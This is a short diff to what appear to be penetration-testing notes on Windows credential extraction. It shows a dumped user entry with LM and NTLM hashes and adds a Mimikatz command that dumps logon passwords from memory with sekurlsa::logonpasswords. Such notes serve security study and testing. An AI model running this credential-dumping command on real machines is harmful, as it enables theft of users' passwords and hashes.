@@ -292,3 +292,12 @@ dave:1103:aad3b435b51404eeaad3b435b51404ee:08d7a47a6f9f66b97b1bae4178747494:::
 ```
 we are interested in the last hash
 
+### Mimikatz
+
+can be used like so:
+
+```
+$results = .\mimikatz.exe privilege::debug sekurlsa::logonpasswords exit
+
+And then simply use $results to read the output
+```
